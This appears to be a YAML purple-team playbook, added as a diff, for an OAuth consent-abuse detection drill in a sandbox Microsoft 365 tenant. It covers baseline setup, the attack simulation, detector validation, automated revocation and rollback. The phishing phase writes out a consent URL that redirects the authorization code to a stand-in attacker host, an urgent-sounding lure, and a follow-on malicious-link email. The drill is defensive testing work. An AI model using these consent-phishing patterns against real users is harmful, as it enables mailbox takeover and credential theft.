@@ -1,0 +1,309 @@
+# SATRIA Purple Team Playbook: OAuth Abuse Detection Drill
+# Based on Grand Design Section 25.2
+
+id: pb-oauth-abuse-purple-01
+name: "OAuth Consent Abuse Detection and Response Drill"
+version: "1.0.0"
+description: "Simulate OAuth consent abuse to validate detection and response capabilities"
+
+metadata:
+  author: "SATRIA AI Purple Team"
+  created: "2025-09-19"
+  mitre_techniques: ["T1528", "T1566.002"]
+  safety_level: "moderate"
+  environment: "sandbox"
+  purple_team: true
+  business_impact: "medium"
+
+# Preconditions for safe execution
+preconditions:
+  - name: "sandbox_environment"
+    check: "saas.m365.sandbox == true"
+    description: "M365 sandbox tenant is active"
+  - name: "okta_sandbox"
+    check: "iam.okta.sandbox == true"
+    description: "Okta sandbox environment is available"
+  - name: "test_users_available"
+    check: "test.users.count >= 3"
+    description: "Test users are provisioned"
+  - name: "detection_systems_online"
+    check: "detectors.oauth_abuse.enabled == true"
+    description: "OAuth abuse detector is active"
+
+# Target configuration
+targets:
+  sandbox_tenant: "satria-sandbox.onmicrosoft.com"
+  test_applications:
+    - name: "Test Mail App"
+      app_id: "test-mail-app-001"
+      permissions: ["mail.read", "mail.send"]
+    - name: "Test Calendar App"
+      app_id: "test-calendar-app-001"
+      permissions: ["calendars.read", "calendars.readwrite"]
+  test_users:
+    - "purpleteam-user1@satria-sandbox.onmicrosoft.com"
+    - "purpleteam-user2@satria-sandbox.onmicrosoft.com"
+    - "purpleteam-victim@satria-sandbox.onmicrosoft.com"
+
+# Scenario phases
+phases:
+  # Phase 1: Setup and Baseline
+  - name: "baseline_setup"
+    description: "Establish baseline OAuth activity"
+    duration: "5m"
+    actions:
+      - name: "create_test_apps"
+        type: "azure.app_registration.create"
+        parameters:
+          apps: "{{targets.test_applications}}"
+          permissions: "minimum_required"
+
+      - name: "normal_oauth_flow"
+        type: "oauth.simulate_normal"
+        parameters:
+          user: "{{targets.test_users[0]}}"
+          app: "{{targets.test_applications[0]}}"
+          consent_type: "user_consent"
+
+  # Phase 2: Phishing Email Simulation
+  - name: "phishing_simulation"
+    description: "Simulate phishing email with malicious OAuth link"
+    duration: "10m"
+    actions:
+      - name: "craft_phishing_email"
+        type: "email.simulation.send"
+        parameters:
+          sender: "noreply@fake-service.com"
+          recipient: "{{targets.test_users[2]}}"  # victim
+          subject: "Urgent: Verify Your Account Access"
+          body_template: "oauth_phishing_template"
+          oauth_link: "https://login.microsoftonline.com/{{targets.sandbox_tenant}}/oauth2/v2.0/authorize?client_id={{targets.test_applications[0].app_id}}&response_type=code&scope=https://graph.microsoft.com/mail.read%20https://graph.microsoft.com/mail.send&redirect_uri=https://evil-attacker.com/callback"
+
+      - name: "simulate_user_click"
+        type: "oauth.consent.simulate"
+        parameters:
+          user: "{{targets.test_users[2]}}"
+          consent_url: "{{phishing_email.oauth_link}}"
+          consent_decision: "grant"
+          external_redirect: true
+
+  # Phase 3: Malicious OAuth Activity
+  - name: "malicious_oauth_usage"
+    description: "Simulate attacker using granted OAuth permissions"
+    duration: "15m"
+    actions:
+      - name: "access_user_mail"
+        type: "graph.api.simulate"
+        parameters:
+          endpoint: "https://graph.microsoft.com/v1.0/me/messages"
+          token: "{{oauth_consent.access_token}}"
+          user_context: "{{targets.test_users[2]}}"
+          suspicious_patterns:
+            - "bulk_email_access"
+            - "external_ip_access"
+
+      - name: "send_malicious_emails"
+        type: "graph.api.simulate"
+        parameters:
+          endpoint: "https://graph.microsoft.com/v1.0/me/sendMail"
+          token: "{{oauth_consent.access_token}}"
+          payload:
+            message:
+              subject: "Re: Important Document"
+              body:
+                content: "Please review the attached document: https://malicious-link.com/doc.pdf"
+              toRecipients:
+                - emailAddress:
+                    address: "{{targets.test_users[0]}}"
+
+  # Phase 4: Detection Validation
+  - name: "detection_validation"
+    description: "Validate that SATRIA detected the OAuth abuse"
+    duration: "5m"
+    actions:
+      - name: "check_oauth_detector"
+        type: "detector.validate"
+        parameters:
+          detector_name: "oauth_abuse"
+          expected_alerts:
+            - "suspicious_oauth_consent"
+            - "external_redirect_detected"
+            - "bulk_email_access_anomaly"
+          time_window: "20m"
+
+      - name: "check_context_graph"
+        type: "context.graph.query"
+        parameters:
+          query: "MATCH (u:User)-[r:OAUTH_CONSENT]->(a:Application) WHERE u.email = '{{targets.test_users[2]}}' AND r.external_redirect = true RETURN r"
+          expected_results: "> 0"
+
+# Response simulation
+response_actions:
+  # Automated Response Phase
+  - name: "automatic_response"
+    description: "Simulate SATRIA's automated response"
+    trigger: "detection.oauth_abuse.confidence > 0.8"
+    actions:
+      - name: "revoke_oauth_consent"
+        type: "orchestrator.iam.revoke_oauth"
+        parameters:
+          user: "{{targets.test_users[2]}}"
+          application: "{{targets.test_applications[0].app_id}}"
+          revoke_all_tokens: true
+          ttl: "24h"
+
+      - name: "retract_malicious_emails"
+        type: "orchestrator.email.retract"
+        parameters:
+          query: "sender:{{targets.test_users[2]}} AND subject:'Re: Important Document'"
+          time_range: "1h"
+          sandbox_mode: true
+
+      - name: "notify_security_team"
+        type: "orchestrator.notification.send"
+        parameters:
+          channels: ["slack", "email"]
+          severity: "medium"
+          message: "OAuth abuse detected and contained in sandbox environment"
+
+  # Manual Response Validation
+  - name: "manual_response_test"
+    description: "Test manual analyst response capabilities"
+    trigger: "manual"
+    actions:
+      - name: "analyst_investigation"
+        type: "copilot.investigate"
+        parameters:
+          incident_id: "{{session_id}}"
+          investigation_scope: "oauth_abuse"
+          expected_findings:
+            - "external_oauth_redirect"
+            - "suspicious_email_access_pattern"
+            - "phishing_email_source"
+
+# Expected detections
+detection_expectations:
+  - event_type: "oauth_consent_anomaly"
+    source: "Azure AD logs"
+    detection_agent: "IAM Telemetry Agent"
+    expected_attributes:
+      - "external_redirect_uri"
+      - "suspicious_permissions"
+      - "first_time_app_consent"
+    severity: "medium"
+    confidence: "> 0.7"
+
+  - event_type: "email_access_anomaly"
+    source: "Graph API logs"
+    detection_agent: "SaaS App Telemetry Agent"
+    expected_attributes:
+      - "bulk_message_access"
+      - "api_access_from_external_ip"
+      - "unusual_access_pattern"
+    severity: "high"
+    confidence: "> 0.8"
+
+  - event_type: "phishing_email_detected"
+    source: "Email security gateway"
+    detection_agent: "Email Security Agent"
+    expected_attributes:
+      - "suspicious_oauth_link"
+      - "external_domain_sender"
+      - "urgency_language_detected"
+    severity: "medium"
+    confidence: "> 0.6"
+
+# Safety and compliance
+safety:
+  approval_required: true
+  approvers: ["purple_team_lead", "security_architect"]
+  simulation_mode: true
+  sandbox_isolation: true
+
+  limits:
+    max_test_emails: 5
+    max_oauth_grants: 3
+    max_api_calls: 100
+    session_timeout: "30m"
+
+  rollback_plan:
+    - name: "revoke_all_test_consents"
+      action: "azure.oauth.revoke_all"
+      scope: "test_applications"
+
+    - name: "delete_test_emails"
+      action: "exchange.mail.purge"
+      query: "sender:purpleteam-*"
+
+    - name: "cleanup_test_apps"
+      action: "azure.app_registration.delete"
+      apps: "{{targets.test_applications}}"
+
+# Success criteria
+success_criteria:
+  - name: "oauth_abuse_detected"
+    metric: "detected_events.oauth_consent_anomaly.count > 0"
+    weight: 0.4
+
+  - name: "email_anomaly_detected"
+    metric: "detected_events.email_access_anomaly.count > 0"
+    weight: 0.3
+
+  - name: "automatic_response_triggered"
+    metric: "response_actions.executed.count >= 2"
+    weight: 0.2
+
+  - name: "manual_investigation_successful"
+    metric: "analyst_investigation.findings.count >= 3"
+    weight: 0.1
+
+# Learning outcomes
+learning_objectives:
+  detection_gaps:
+    - "OAuth consent monitoring coverage"
+    - "Cross-application correlation"
+    - "Email access pattern analysis"
+    - "Phishing detection effectiveness"
+
+  response_validation:
+    - "Automated revocation speed"
+    - "Email retraction capability"
+    - "Analyst investigation tools"
+    - "Cross-system coordination"
+
+  improvements:
+    - "Detection rule tuning recommendations"
+    - "Response playbook optimizations"
+    - "Training material updates"
+    - "Policy adjustments"
+
+# Post-exercise analysis
+post_execution:
+  - name: "detection_effectiveness_analysis"
+    action: "analysis.detection_rate"
+    parameters:
+      expected_events: "{{detection_expectations}}"
+      actual_events: "{{siem.events.session_id}}"
+      success_threshold: 0.8
+
+  - name: "response_time_analysis"
+    action: "analysis.response_metrics"
+    parameters:
+      target_mttr: "5m"
+      target_mttd: "2m"
+      actual_metrics: "{{orchestrator.metrics.session_id}}"
+
+  - name: "false_positive_analysis"
+    action: "analysis.false_positive_rate"
+    parameters:
+      legitimate_actions: "{{baseline_setup.actions}}"
+      flagged_actions: "{{detection_results.flagged}}"
+
+  - name: "consciousness_layer_update"
+    action: "memory.store_purple_exercise"
+    parameters:
+      scenario: "oauth_abuse_drill"
+      detection_performance: "{{detection_effectiveness_analysis}}"
+      response_performance: "{{response_time_analysis}}"
+      lessons_learned: "{{learning_objectives}}"
+      recommendations: "{{post_execution_analysis.improvements}}"
